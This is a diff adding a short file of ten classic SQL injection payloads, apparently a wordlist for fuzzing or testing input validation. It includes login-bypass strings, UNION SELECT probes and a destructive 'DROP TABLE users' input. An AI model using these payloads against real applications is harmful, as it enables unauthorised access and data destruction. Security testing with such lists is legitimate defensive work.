@@ -1,0 +1,10 @@
+' OR 1=1--
+' OR '1'='1
+admin' OR '1'='1
+' OR 'a'='a
+1' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+admin'--
+' AND 1=0 UNION ALL SELECT 'admin', 'password
+1; DROP TABLE users--
+' OR 1=1#
